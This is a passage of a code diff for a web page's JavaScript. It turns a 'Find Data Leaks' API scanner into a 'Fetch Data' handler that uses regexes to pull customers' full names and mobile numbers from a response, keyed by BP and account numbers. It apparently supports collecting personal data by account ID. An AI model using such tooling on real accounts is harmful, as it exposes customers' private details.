+                const nameMatch = responseText.match(/full_name["']?\s*[:=]\s*["']?([^"'\n,}]+)/i);
+                const mobileMatch = responseText.match(/mobile["']?\s*[:=]\s*["']?([^"'\n,}]+)/i);
+                if (nameMatch || mobileMatch) {
+                    const extractedData = {
+                        response: {
+                            full_name: nameMatch ? nameMatch[1].trim() : 'Unknown',
+                            mobile: mobileMatch ? mobileMatch[1].trim() : 'N/A',
+                            bp_number: bp || 'N/A'
+                        }
+                    };
+                    resultDiv.innerHTML = buildResult(extractedData, responseText, leaks, { bp, ca, bill });
+                    setStatus(`✅ Data extracted! ${leaks.length > 0 ? '🔴 ' + leaks.length + ' leaks detected' : '🔒 No leaks'}`, leaks.length > 0 ? 'error' : 'success');
+                } else {
+                    resultDiv.innerHTML = `
+                        <div class="result-card">
+                            <div class="result-header">
+                                <div class="title"><i class="fas fa-exclamation-triangle"></i> No Data Found</div>
+                                <span class="badge-risk" style="background:#eab308;">⚠️</span>
                             </div>
-                            <div class="match-details">
-                                <div class="match-fields">
-                                    ${matches.map(m => `
-                                        <div class="field-box">
-                                            <span class="label">${m.type}</span>
-                                            <span class="value">${escapeHtml(m.value)}</span>
-                                        </div>
-                                    `).join('')}
-                                </div>
-                                <div class="response-box">${escapeHtml(response)}</div>
+                            <div class="result-body">
+                                <p style="color:#8b949e;">No customer data found for BP: <strong>${bp || 'N/A'}</strong>, CA: <strong>${ca || 'N/A'}</strong></p>
+                                <div class="response-box">${escapeHtml(responseText.substring(0, 500))}</div>
                             </div>
                         </div>
                     `;
-                });
-
-                matchResults.innerHTML = html;
-                matchResults.style.display = 'block';
-
-                setStatus(`🔴 ${matchCount} API${matchCount > 1 ? 's' : ''} found with matching data!`, 'error');
-            } else {
-                matchResults.innerHTML = `
-                    <div class="no-match">
-                        <i class="fas fa-search"></i>
-                        <h3>No matching data found</h3>
-                        <p style="color:#64748b;font-size:14px;margin-top:6px;">
-                            Searched for "${searchDesc}" in ${discoveredApis.length} APIs
-                        </p>
-                    </div>
-                `;
-                matchResults.style.display = 'block';
-                setStatus(`✅ No matches found for "${searchDesc}"`, 'success');
+                    setStatus('⚠️ No customer data found', 'warning');
+                }
             }
 
-            log(`🏁 Scan complete! ${matchCount} matches found.`, 'success');
+            resultDiv.style.display = 'block';
+            log(`🏁 Fetch complete!`, 'success');
 
         } catch (error) {
             setStatus(`❌ Error: ${error.message}`, 'error');
             log(`❌ ${error.message}`, 'error');
         } finally {
-            isRunning = false;
             this.disabled = false;
-            this.innerHTML = '<i class="fas fa-radar"></i> Find Data Leaks';
+            this.innerHTML = '<i class="fas fa-download"></i> Fetch Data';
         }
     });
 </script>
